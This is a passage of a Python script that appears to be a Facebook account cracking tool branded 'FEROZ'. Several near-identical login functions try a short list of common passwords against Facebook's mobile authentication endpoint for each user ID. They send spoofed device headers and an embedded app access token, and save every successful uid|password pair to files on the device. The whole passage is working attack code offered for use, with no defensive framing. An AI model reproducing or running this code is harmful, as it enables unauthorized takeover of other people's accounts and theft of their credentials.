            'X-Tigon-Is-Retry': 'False', 
            'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62', 
            'x-fb-device-group': '5120', 
            'X-FB-Friendly-Name': 'ViewerReactionsMutation', 
            'X-FB-Request-Analytics-Tags': 'graphservice', 
            'X-FB-HTTP-Engine': 'Liger', 
            'X-FB-Client-IP': 'True', 
            'X-FB-Server-Cluster': 'True', 
            'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62', 
            'Content-Length': '706'}
            url = "https://b-graph.facebook.com/auth/login"
            rp = requests.post(url,data=data,headers=head,allow_redirects=False,verify=True).json()
            if "session_key" in rp:            	
                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mFEROZ\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
                open("/sdcard/FEROZ-M2-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                cps.append(uid)
                break
            elif "www.facebook.com" in rp['error']['message']:
                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mFEROZ\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
                open("/sdcard/FEROZ-M2-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break
            else:continue
        loop+=1
    except Exception as e:time.sleep(30)
def login3(uid):
    global oks,loop,cps
    Session=requests.session()
    try:
        sys.stdout.write(f'\r\r\33[38;5;37m[\x1b[38;5;46mFEROZ\33[38;5;37m-\x1b[38;5;46mS3\33[38;5;37m]\033[1;97m-\33[38;5;37m[\033[1;97m{loop}\33[38;5;37m]\033[1;97m-\33[38;5;37m[\x1b[38;5;46mOK\33[38;5;160m/\x1b[38;5;208mCP\33[38;5;37m]\033[1;97m-\33[38;5;37m[\x1b[38;5;46m{len(oks)}\33[38;5;160m/\x1b[38;5;208m{len(cps)}\33[38;5;37m]')
        sys.stdout.flush()
        ua = random.choice(ugen)
        ua = windows()
        for pw in ["123456","1234567","12345678","123456789","111222"]:
            data = {'adid':str(uuid.uuid4()),
            'format': 'json',
            'device_id':str(uuid.uuid4()),
            'cpl': 'true',
            'family_device_id':str(uuid.uuid4()),
            'credentials_type': 'device_based_login_password', 
            'error_detail_type': 'button_with_disabled', 
            'source': 'device_based_login', 
            'email':str(uid),
            'password':str(pw),
            'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32', 
            'generate_session_cookies': '1', 
            'meta_inf_fbmeta': '', 
            'advertiser_id':str(uuid.uuid4()),
            'currently_logged_in_userid': '0', 
            'locale': 'en_US',
            'client_country_code': 'US', 
            'method': 'auth.login', 
            'fb_api_req_friendly_name': 'authenticate', 
            'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler', 
            'api_key': '882a8490361da98702bf97a021ddc14d'}
            head = {'User-Agent': arnold(),
            'Content-Type': 'application/x-www-form-urlencoded', 
            'Host': 'graph.facebook.com', 
            'X-FB-Net-HNI': '25227',
            'X-FB-SIM-HNI': '29752',
            'X-FB-Connection-Type': 'MOBILE.LTE', 
            'X-Tigon-Is-Retry': 'False', 
            'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62', 
            'x-fb-device-group': '5120', 
            'X-FB-Friendly-Name': 'ViewerReactionsMutation', 
            'X-FB-Request-Analytics-Tags': 'graphservice', 
            'X-FB-HTTP-Engine': 'Liger', 
            'X-FB-Client-IP': 'True', 
            'X-FB-Server-Cluster': 'True', 
            'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62', 
            'Content-Length': '706'}
            url = "https://b-graph.facebook.com/auth/login"
            rp = requests.post(url,data=data,headers=head,allow_redirects=False,verify=True).json()
            if "session_key" in rp:            	
                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mFEROZ\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
                open("/sdcard/FEROZ-M3-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                cps.append(uid)
                break
            elif "www.facebook.com" in rp['error']['message']:
                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mFEROZ\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
                open("/sdcard/FEROZ-M3-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break
            else:continue
        loop+=1
    except Exception as e:time.sleep(30)
def login4(uid):
    global oks,loop,cps
    Session=requests.session()
    try:
        sys.stdout.write(f'\r\r\33[38;5;37m[\x1b[38;5;46mFEROZ\33[38;5;37m-\x1b[38;5;46mS4\33[38;5;37m]\033[1;97m-\33[38;5;37m[\033[1;97m{loop}\33[38;5;37m]\033[1;97m-\33[38;5;37m[\x1b[38;5;46mOK\33[38;5;160m/\x1b[38;5;208mCP\33[38;5;37m]\033[1;97m-\33[38;5;37m[\x1b[38;5;46m{len(oks)}\33[38;5;160m/\x1b[38;5;208m{len(cps)}\33[38;5;37m]')
        sys.stdout.flush()
        ua = random.choice(ugen)
        ua = windows()
        for pw in ["123456","1234567","12345678","123456789","111222"]:
            data = {'adid':str(uuid.uuid4()),
            'format': 'json',
            'device_id':str(uuid.uuid4()),
            'cpl': 'true',
            'family_device_id':str(uuid.uuid4()),
            'credentials_type': 'device_based_login_password', 
            'error_detail_type': 'button_with_disabled', 
            'source': 'device_based_login', 
            'email':str(uid),
            'password':str(pw),
            'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32', 
            'generate_session_cookies': '1', 
            'meta_inf_fbmeta': '', 
            'advertiser_id':str(uuid.uuid4()),
            'currently_logged_in_userid': '0', 
            'locale': 'en_US',
            'client_country_code': 'US', 
            'method': 'auth.login', 
            'fb_api_req_friendly_name': 'authenticate', 
            'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler', 
            'api_key': '882a8490361da98702bf97a021ddc14d'}
            head = {'User-Agent': arnold(),
            'Content-Type': 'application/x-www-form-urlencoded', 
            'Host': 'graph.facebook.com', 
            'X-FB-Net-HNI': '25227',
            'X-FB-SIM-HNI': '29752',
            'X-FB-Connection-Type': 'MOBILE.LTE', 
            'X-Tigon-Is-Retry': 'False', 
            'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62', 
            'x-fb-device-group': '5120', 
            'X-FB-Friendly-Name': 'ViewerReactionsMutation', 
            'X-FB-Request-Analytics-Tags': 'graphservice', 
            'X-FB-HTTP-Engine': 'Liger', 
            'X-FB-Client-IP': 'True', 
            'X-FB-Server-Cluster': 'True', 
            'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62', 
            'Content-Length': '706'}
            url = "https://b-graph.facebook.com/auth/login"
            rp = requests.post(url,data=data,headers=head,allow_redirects=False,verify=True).json()
            if "session_key" in rp:            	
                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mFEROZ\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
                open("/sdcard/FEROZ-M4-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                cps.append(uid)
                break
            elif "www.facebook.com" in rp['error']['message']:
                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mFEROZ\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
                open("/sdcard/FEROZ-M4-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break
            else:continue
        loop+=1
    except Exception as e:time.sleep(30)
main()